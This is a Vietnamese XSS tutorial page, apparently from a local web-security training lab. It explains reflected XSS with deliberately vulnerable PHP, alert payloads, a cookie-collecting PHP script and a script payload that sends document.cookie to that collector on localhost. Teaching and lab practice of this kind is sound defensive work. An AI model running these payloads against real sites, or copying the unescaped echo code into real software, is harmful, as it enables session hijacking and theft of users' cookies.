<main class="main" role="main">
    <div class="content">
        <article id="post-xss/xss_tongquan" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Tổng Quan về Cross-Site Scripting (XSS)
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
                <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <p><strong>Cross-Site Scripting (XSS)</strong> là một loại lỗ hổng bảo mật tiêu biểu được tìm thấy trên các ứng dụng web.<br>Là kiểu tấn công injection nhưng lại được xếp hạng riêng (Hạng 7). Bởi vì điểm khác biệt với các loại tấn công injection khác là được diễn ra ở Client-Side.</p>
                <h1 id="Tai-sao-lai-ton-tai-lo-hong-XSS"><a href="#Tai-sao-lai-ton-tai-lo-hong-XSS" class="headerlink" title="Tại sao lại tồn tại lỗ hổng XSS?"></a>Tại sao lại tồn tại lỗ hổng XSS?</h1>
                <p>Cuộc tấn công XSS xảy ra khi mà kẻ tấn công sử dụng một ứng dụng web tin cậy để gửi mã độc (là các đoạn mã script mà trình duyệt của người dùng phải thực thi) tới người dùng cuối.</p>
                <p>Như các bạn đã biết, có hai loại ngôn ngữ được sử dụng để xây dựng 1 ứng dụng website:</p>
                <ul>
                    <li>Client side như là: HTML, CSS, JavaScript (HTML/CSS là siêu văn bản). Được chạy ở phía Client (Trình duyệt)</li>
                    <li>Server side như là: PHP, ASP, JSP. Được chạy ở phía Server (Apache, IIS..)</li>
                </ul>
                <p>Lỗ hổng XSS tồn tại là do ngôn ngữ phía Server Side (Không kiểm soát đc input người dùng). Nhưng nơi mà mã độc thực thi và tấn công lại phía người dùng (Do trình duyệt tự động load về và chạy).<br>Khi ta gửi request đến một trang web, ta sẽ nhận kết quả trả về dưới dạng các ngôn ngữ phía client side, ví dụ như:<br></p>
                <figure class="highlight plain">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">&lt;!-- Thử chèn mã HTML --&gt;</span><br><span class="line"> </span><br><span class="line">&lt;h1&gt;Welcome to XSS&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Thử với javascript --&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert("Welcome to XSS")&lt;/script&gt;</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Sau đó, trình duyệt sẽ chạy những đoạn mã này. Và hiển thị lên cho người dùng dạng chữ,hình ảnh, video…</p>
                <h2 id="Li-do-o-dau"><a href="#Li-do-o-dau" class="headerlink" title="Lí do ở đâu?"></a>Lí do ở đâu?</h2>
                <p>Như đã nói ở SQLi, website lúc nào cũng có sự tương tác với người dùng. Đôi khi một số thông tin người dùng nhập vào sẽ được tham gia vào cấu trúc thông tin,đoạn mã được gửi về người dùng để phía client chạy.<br>Dựa vào sai lầm của nhà phát triển về việc sử dụng input người dùng, kẻ tấn công lợi dụng việc này để chèn và sửa đổi nội dung kết quả trả về cho người dùng của ứng dụng web.</p>
                <h2 id="Vi-du"><a href="#Vi-du" class="headerlink" title="Ví dụ"></a>Ví dụ</h2>
                <p>Ứng dụng web,cho người dùng nhập vào tên, sau đó hiển thị ra nội dung tên vừa mới nhập vào, như sau:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>])){</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Xin chào "</span>.$_GET[<span class="string">'name'</span>];</span><br><span class="line">}</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Một người dùng A nhập vào tên: Vương. URL có dạng (Truyền biến dùng GET):</p>
                <blockquote>
                    <p><a href="http://localhost/final/index.php?page=xss_tongquan&amp;name=Vương" target="_blank" rel="noopener">http://localhost/final/index.php?page=xss_tongquan&amp;name=Vương</a></p>
                </blockquote>
                <p>Kết quả trả về sẽ là:</p>
                <blockquote>
                    <p>Xin chào Vương</p>
                </blockquote>
                <p>Kẻ tấn công lợi dụng việc này thay đổi tên thành đoạn code Javascript, như sau:</p>
                <blockquote>
                    <p>&lt;script&gt;alert(“Hacked”);&lt;/script&gt;</p>
                </blockquote>
                <p>Kết quả trả về sẽ là:</p>
                <blockquote>
                    <p>Xin chào &lt;script&gt;alert(“Hacked”);&lt;/script&gt; &lt;= Đoạn code này được thực thi vì nó là javascript, ko hiển thị lên nhé (Mình hiển thị cho các bạn hiểu).</p>
                </blockquote>
                <p>Trình duyệt sẽ hiểu Xin chào là html, hiển thị ra page: <strong>Xin chào</strong><br>Còn đoạn &lt;script&gt;alert(“Hacked”);&lt;/script&gt; là đoạn code javascript, nên trình duyệt sẽ thực thi và hiển thị lên popup có nội dung là Hacked</p>
                <p>Đương nhiên,kẻ tấn công sẽ không dừng lại ở đó. Mà sẽ dùng nó để đánh cắp hay thực hiện một số hành động nguy hiểm hơn.</p>
                <h1 id="Muc-tieu-cua-cuoc-tan-cong-XSS"><a href="#Muc-tieu-cua-cuoc-tan-cong-XSS" class="headerlink" title="Mục tiêu của cuộc tấn công XSS"></a>Mục tiêu của cuộc tấn công XSS</h1>
                <p>Một cuộc tấn công XSS thành công dẫn đến trình duyệt người dùng sẽ thực thi những đoạn mã script. Vậy những đoạn mã script này có thể làm gì, thì hacker có thể làm những công việc ấy.<br>Một số thông tin và hành động nguy hiểm như:</p>
                <ul>
                    <li>Đánh cắp Cookie: Hacker có thể đánh cắp cookie của người bằng cách gửi chúng về server mà hacker đang kiểm soát. Từ đó có thể giả mạo phiên đăng nhập hoặc lấy những thông tin nhạy cảm có lưu trong cookie.</li>
                    <li>Keyloggging: Hacker có thể lưu lại những thao tác gõ phím, di chuột.. của người dùng với mục đích như đánh cắp thông tin người dùng,phân tích hành vi người dùng.</li>
                    <li>Deface (Phishing): Hacker có thể thay đổi giao diện của website bằng cách thay đổi các thẻ html để đánh lừa người dùng. (Ví dụ: Tạo form nhập mật khẩu giả, nếu người dùng nhập vào và đăng nhập thì thông tin sẽ gửi lên server của hacker)</li>
                </ul>
                <h2 id="Cookie-va-Session"><a href="#Cookie-va-Session" class="headerlink" title="Cookie và Session"></a>Cookie và Session</h2>
                <p>Để hiểu được mục đích hacker lấy cookie để làm gì, ta phải hiểu nó là cái gì trước đã. Hai khái niệm sau rất dễ nhầm lẫn. Nên phân biệt chúng một cách rõ ràng.</p>
                <h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3>
                <p>Cookie là một đoạn văn bản ghi thông tin được tạo ra tại server gửi cho người dùng (nếu là lần đầu tiên request tới) và lưu trên trình duyệt của người dùng.<br>Với những lần truy cập sau, trình duyệt sẽ tự động thêm cookie này vào trong header của gói tin để gửi tới server.<br>Cookie dùng để lưu những thông tin tạm thời như tên đăng nhập, mật khẩu, các tuỳ chọn của người dùng… Các thông tin này giúp nhận biệt được người dùng khi truy cập vào một trang web.<br><strong>Chú ý về cookie</strong>:</p>
                <ul>
                    <li>Hai website khác nhau sẽ sử dụng cookie khác nhau. (Do được server tạo ra).</li>
                    <li>Một website nhưng với hai trình duyệt khác nhau sẽ dùng các cookie khác nhau. (Dù trên cùng một máy tính)</li>
                    <li>Nếu dùng cookie giống nhau trong request gửi tới server. Server sẽ hiểu đó là do 1 người (1 trình duyệt) phản hồi như nhau.</li>
                    <li>Có thời gian sống nhất định</li>
                    <li>Người dùng có thể sửa đổi được.</li>
                </ul>
                <h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3>
                <p>Sesion (hay còn gọi là phiên làm việc) được hiểu là khoảng thời gian người dùng giao tiếp với ứng dụng. Một session được bắt đầu khi người dùng truy cập vào ứng dụng lần đầu tiên, và kết thúc khi người dùng thoát khỏi ứng dụng.<br>Session được lưu trong một tập tin trên máy chủ, được cấp cho một ID riêng gọi là SessionID. Session có thể dùng để lưu trữ nhiều loại thông tin tạm thời khác nhau.<br>Session được dùng để lưu trữ các thông tin tạm thời của người dùng sử dụng website.<br><strong>Chú ý về session:</strong></p>
                <ul>
                    <li>Lưu trên server, người dùng không thể biết nội dung và can thiệp.</li>
                    <li>Mối quan hệ giữa Session và Cookie.</li>
                    <li>Khi tạo ra một session trên máy chủ để lưu trữ thông tin tạm thời của người dùng. Nhưng làm sao để máy chủ biết được session nào là của người dùng nào?</li>
                </ul>
                <p><strong>Ví dụ:</strong> Khách hàng A truy cập -&gt; Lưu lại. Xong khách hàng B truy cập -&gt; Lưu lại. Rồi khách hàng A gửi yêu cầu tiếp, vậy tập tin nào mới là của khác hàng A?</p>
                <h3 id="Moi-quan-he-giua-Cookie-va-Session"><a href="#Moi-quan-he-giua-Cookie-va-Session" class="headerlink" title="Mối quan hệ giữa Cookie và Session"></a>Mối quan hệ giữa Cookie và Session</h3>
                <p>Vì thế nên mỗi session sẽ tạo ra một cookie tương ứng với nó nhằm phân biệt được người dùng nào.<br>Nếu chiếm được cookie của người dùng A. Tức là ta có thể đánh lừa server rằng những thông tin lưu trên session của người dùng A là của mình.</p>
                <h3 id="XSS-giup-danh-cap-COOKIE-Roi-tu-cookie-co-duoc-ta-se-chiem-duoc-SESSION"><a href="#XSS-giup-danh-cap-COOKIE-Roi-tu-cookie-co-duoc-ta-se-chiem-duoc-SESSION" class="headerlink" title="XSS giúp đánh cắp COOKIE. Rồi từ cookie có được,ta sẽ chiếm được SESSION."></a>XSS giúp đánh cắp <strong>COOKIE</strong>. Rồi từ cookie có được,ta sẽ chiếm được <strong>SESSION</strong>.</h3>
                <h1 id="Cach-hoat-dong"><a href="#Cach-hoat-dong" class="headerlink" title="Cách hoạt động"></a>Cách hoạt động</h1>
                <p>Kênh tấn công của XSS là input của người dùng như các trường tin nhắn, username, search…<br>Nó xảy ra khi đáp ứng các yêu cầu sau:</p>
                <ul>
                    <li>Input của user được dùng vào kết quả trả về cho user.(Ví dụ nhập search: Việt Nam =&gt; Kết quả trả về là “Việt Nam vô địch” chẳng hạn)</li>
                    <li>
                        Không bị <strong>“filter input and escape output”</strong>:
                        <ul>
                            <li>Filter input: Khi nhập vào các đoạn mã độc, không bị filter. Ví dụ nhập &lt;script&gt; mà nó lại filter dấu &lt; thì thua.</li>
                            <li>Escape output: HTML có cơ chế để hiển thị các kí tự như &lt;script&gt; mà không được hiểu là javascript. Ví dụ dấu <em>&lt;</em> thì là <strong>“&amp;lt”</strong></li>
                        </ul>
                    </li>
                </ul>
                <h2 id="Vi-du-1"><a href="#Vi-du-1" class="headerlink" title="Ví dụ"></a>Ví dụ</h2>
                <p>Có một form input cho nhập tên, sau đó kết quả sẽ trả về Xin chào người dùng đó. Code như sau:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>])){</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Xin chào "</span>.$_GET[<span class="string">'name'</span>];</span><br><span class="line">}</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Kẻ tấn công,sẽ input như sau vào trường <b>name</b> như sau:</p>
                <blockquote>
                    <p>&lt;script&gt;alert(“Hacked”);&lt;/script&gt;</p>
                </blockquote>
                <p>Thì cửa sổ với nội dung <strong>Hacked</strong> sẽ được hiện lên.<br>Thử lại với payload:</p>
                <blockquote>
                    <p>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</p>
                </blockquote>
                <p>Bạn sẽ xem được thông tin có lưu trong <strong>cookie</strong> của trình duyệt hiện tại. Hacker muốn lấy thông tin này của người dùng.</p>
                <h2 id="Cach-gui-cookie-ve-server-cua-minh"><a href="#Cach-gui-cookie-ve-server-cua-minh" class="headerlink" title="Cách gửi cookie về server của mình."></a>Cách gửi cookie về server của mình.</h2>
                <p>Xây dựng trang web trên server mình,như sau:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="comment"># Trang web mình viết sẵn tại thư mục /test_case/xss/get_cookie.php</span></span><br><span class="line"><span class="comment"># URL sẽ là: localhost/test_case/xss/get_cookie.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cookie'</span>])){</span><br><span class="line">	$myfile = fopen(<span class="string">"cookie.txt"</span>, <span class="string">"a"</span>); <span class="comment"># Ghi vào file cookie.txt</span></span><br><span class="line">	fwrite($myfile, <span class="string">"\n"</span>. $_GET[<span class="string">'cookie'</span>]);</span><br><span class="line">    fclose($myfile);</span><br><span class="line">}</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Chèn vào script mã độc:</p>
                <blockquote>
                    <p>&lt;script&gt;document.location=”<a href="http://localhost/test_case/xss/get_cookie.php/?cookie=&quot;+document.cookie&lt;/script" target="_blank" rel="noopener">http://localhost/test_case/xss/get_cookie.php/?cookie="+document.cookie&lt;/script</a>&gt;</p>
                </blockquote>
                <p>Đoạn mã này sẽ chuyển hướng website load nó sang URL:</p>
                <blockquote>
                    <p><a href="http://localhost/test_case/xss/get_cookie.php?cookie=victim_cookie" target="_blank" rel="noopener">http://localhost/test_case/xss/get_cookie.php?cookie=victim_cookie</a></p>
                </blockquote>
                <p>Thử payload và kiểm tra file /test_case/xss/cookie.txt xem bạn đã lấy được cookie của chính mình chưa.</p>
                <h2 id="Neu-khong-thanh-cong"><a href="#Neu-khong-thanh-cong" class="headerlink" title="Nếu không thành công."></a>Nếu không thành công.</h2>
                <p>Có thể do các vấn đề như sau:</p>
                <ul>
                    <li>Có thể do trình duyệt như Cốc cốc có thể tự động phát hiện và chặn một số loại XSS cơ bản.</li>
                    <li>Có thể do document.cookie không chưa gì hết, kiểm tra lại bằng đoạn alert(document.cookie)</li>
                    <li>
                        Có thể đường dẫn URL sai do bạn không cài source vào thư mục gốc, mà có thư mục con, ví dụ <b>TEST_HERE</b> thì phải sửa lại URL:
                        <blockquote>
                            <p>&lt;script&gt;document.location=”<a href="http://localhost/TEST_HERE/test_case/xss/get_cookie.php/?cookie=&quot;+document.cookie&lt;/script" target="_blank" rel="noopener">http://localhost/TEST_HERE/test_case/xss/get_cookie.php/?cookie="+document.cookie&lt;/script</a>&gt;</p>
                        </blockquote>
                    </li>
                </ul>
                <h1 id="Tham-khao"><a href="#Tham-khao" class="headerlink" title="Tham khảo"></a>Tham khảo</h1>
                <ul>
                    <li>OWASP XSS: <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></li>
                    <li><a href="https://searchsecurity.techtarget.com/definition/cross-site-scripting" target="_blank" rel="noopener">SearchSecurity Target</a></li>
                </ul>
            </div>
        </article>
        <?php
        if(isset($_GET['change_status'])){
            if($_GET['change_status'] == 1){
                change_status($id_post);
            }
        }
        echo print_footer_status($id_post,$title);
        ?>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>